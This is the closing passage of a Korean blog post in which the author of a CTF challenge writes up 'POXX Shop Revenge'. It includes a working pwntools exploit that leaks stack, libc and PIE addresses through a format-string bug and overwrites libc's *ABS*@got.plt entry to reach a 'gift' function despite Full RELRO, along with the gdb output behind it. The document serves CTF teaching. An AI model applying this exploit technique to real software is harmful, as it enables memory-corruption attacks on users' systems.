<h3 id="loop-횟수-변경"><a href="#loop-횟수-변경" class="headerlink" title="loop 횟수 변경"></a>loop 횟수 변경</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import struct</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -1)</span><br><span class="line">b&#x27;\xff\xff\xff\xff&#x27;</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -10)</span><br><span class="line">b&#x27;\xf6\xff\xff\xff&#x27;</span><br><span class="line">&gt;&gt;&gt; struct.pack(&#x27;i&#x27;, -1) + struct.pack(&#x27;i&#x27;, -10)</span><br><span class="line">b&#x27;\xff\xff\xff\xff\xf6\xff\xff\xff&#x27;</span><br></pre></td></tr></table></figure>

<p>위 바이트 문자열을 long long int로 unpack하면 아래와 같다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; struct.unpack(&#x27;q&#x27;, (struct.pack(&#x27;i&#x27;, -1) + struct.pack(&#x27;i&#x27;, -10)))</span><br><span class="line">(-38654705665,)</span><br></pre></td></tr></table></figure>

<p>참고로 굳이 loop 횟수를 변경하지 않아도 된다. 그 이유는 우리는 stack과 pie만 구하면 되는데 fsb가 터질 때 글자 수가 충분하기 때문이다.</p>
<h2 id="Exploit-Scnario-2"><a href="#Exploit-Scnario-2" class="headerlink" title="Exploit Scnario 2"></a>Exploit Scnario 2</h2><ol>
<li>stack address를 구한 뒤, loop 횟수 변경</li>
<li>libc base 구하기</li>
<li>pie base 구하기</li>
<li><code>*ABS*@got.plt</code>를 gift 함수 주소로 덮기 (got overwriting)</li>
</ol>
<h2 id="Exploit-Code-1"><a href="#Exploit-Code-1" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Buy</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exchange</span>(<span class="params">addr, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [1]</span></span><br><span class="line">Buy(<span class="string">&#x27;%29$p&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># struct.unpack(&#x27;q&#x27;,(struct.pack(&#x27;i&#x27;,-1)+struct.pack(&#x27;i&#x27;,-10)))[0]</span></span><br><span class="line"><span class="comment"># -38654705665</span></span><br><span class="line">Exchange(stack_leak + <span class="number">0xb0</span>, -<span class="number">38654705665</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [2]</span></span><br><span class="line">pause()</span><br><span class="line">Buy(<span class="string">&#x27;%37$p_&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x23290</span></span><br><span class="line">info(<span class="string">&#x27;libc base :: &#x27;</span> + <span class="built_in">hex</span>(libc.address)) <span class="comment"># libc base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [3]</span></span><br><span class="line">Buy(<span class="string">&#x27;%39$p_&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x1277</span></span><br><span class="line">info(<span class="string">&#x27;pie base :: &#x27;</span> + <span class="built_in">hex</span>(e.address)) <span class="comment"># pie base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [4]</span></span><br><span class="line">abs_got = libc.address + <span class="number">0x1d8050</span></span><br><span class="line">info(<span class="string">&#x27;abs got :: &#x27;</span> + <span class="built_in">hex</span>(abs_got))</span><br><span class="line"></span><br><span class="line">Exchange(abs_got, e.sym[<span class="string">&#x27;gift&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="GOT-overwriting"><a href="#GOT-overwriting" class="headerlink" title="GOT overwriting"></a>GOT overwriting</h3><p>Full RELRO임에도 GOT overwriting이 가능하다.</p>
<p>puts의 구현 초반부를 gdb에서 확인하면 아래와 같다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ab33aa0 &lt;puts&gt;:       endbr64</span><br><span class="line">0x7fa31ab33aa4 &lt;puts+4&gt;:     push   r14</span><br><span class="line">0x7fa31ab33aa6 &lt;puts+6&gt;:     push   r13</span><br><span class="line">0x7fa31ab33aa8 &lt;puts+8&gt;:     push   r12</span><br><span class="line">0x7fa31ab33aaa &lt;puts+10&gt;:    mov    r12,rdi</span><br><span class="line">0x7fa31ab33aad &lt;puts+13&gt;:    push   rbp</span><br><span class="line">0x7fa31ab33aae &lt;puts+14&gt;:    push   rbx</span><br><span class="line">0x7fa31ab33aaf &lt;puts+15&gt;:    sub    rsp,0x10</span><br><span class="line">0x7fa31ab33ab3 &lt;puts+19&gt;:    call   0x7fa31aae12b0 &lt;*ABS*+0x9d080@plt&gt;</span><br></pre></td></tr></table></figure>

<p><code>*ABS*+0x9d080@plt</code> 을 call하고 있는데, 안에 들어가서 확인해보면 아래와 같다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31aae12b0 &lt;*ABS*+0x9d080@plt&gt;:  endbr64</span><br><span class="line">0x7fa31aae12b4 &lt;*ABS*+0x9d080@plt+4&gt;:        bnd jmp QWORD PTR [rip+0x1b5d95]        # 0x7fa31ac97050 &lt;*ABS*@got.plt&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vm 0x7fa31ac97050</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x007fa31ac97000 0x007fa31ac99000 0x000000001d8000 rw- /usr/lib/libc.so.6</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>*ABS*@got.plt</code> 주소를 참조해서 jmp하므로 gift로 바꿔서 익스하면 될 듯 하다. 풀렐로 임에도 불구하고 쓰기 권한이 존재한다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ac97050 &lt;*ABS*@got.plt&gt;: 0x00007fa31ac27920</span><br></pre></td></tr></table></figure>

<p>overwriting 후.. <code>*ABS*@got.plt</code> 주소에 gift 주소를 저장시킬 수 있다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7fa31ac97050 &lt;*ABS*@got.plt&gt;: 0x0000558eefe46257</span><br></pre></td></tr></table></figure>

<p>이 후에 <code>puts</code> 함수가 실행된다면 gift 함수가 실행될 것이다.</p>
<h2 id="Review"><a href="#Review" class="headerlink" title="Review"></a>Review</h2><p>Demon 팀으로써 CTF 문제를 출제한 것 중에 가장 공을 들였고 오래걸렸다. 최신 libc를 가진 문제는 많이 풀이를 안해봐서 두 번째 익스 방법은 몰랐다. 새로운 것을 배워서 기분이 좋다 :) 이 문제 덕분에 최신 libc도 분석을 해보았는데 관련 내용은 Docs 카테고리에 (언젠간) 업뎃할 예정이다.</p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/categories/">Category</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Info"><span class="toc-number">1.</span> <span class="toc-text">Info</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#description"><span class="toc-number">1.1.</span> <span class="toc-text">description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#for-player"><span class="toc-number">1.2.</span> <span class="toc-text">for player</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mitigation"><span class="toc-number">3.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Souece-Code"><span class="toc-number">4.</span> <span class="toc-text">Souece Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vunlerability"><span class="toc-number">5.</span> <span class="toc-text">Vunlerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">6.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Scnario-1-intend"><span class="toc-number">7.</span> <span class="toc-text">Exploit Scnario 1 (intend)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">8.</span> <span class="toc-text">Exploit Code</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#loop-%ED%9A%9F%EC%88%98-%EB%B3%80%EA%B2%BD"><span class="toc-number">8.1.</span> <span class="toc-text">loop 횟수 변경</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Scnario-2"><span class="toc-number">9.</span> <span class="toc-text">Exploit Scnario 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Code-1"><span class="toc-number">10.</span> <span class="toc-text">Exploit Code</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GOT-overwriting"><span class="toc-number">10.1.</span> <span class="toc-text">GOT overwriting</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Review"><span class="toc-number">11.</span> <span class="toc-text">Review</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/221121-poxx2022-shop_revenge/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&text=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&title=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&is_video=false&description=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)&body=Check out this article: https://jiravvit.github.io/221121-poxx2022-shop_revenge/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&title=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&title=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&title=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&title=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&name=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&t=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022
    jir4vvit
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'jiravvit-github-io';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
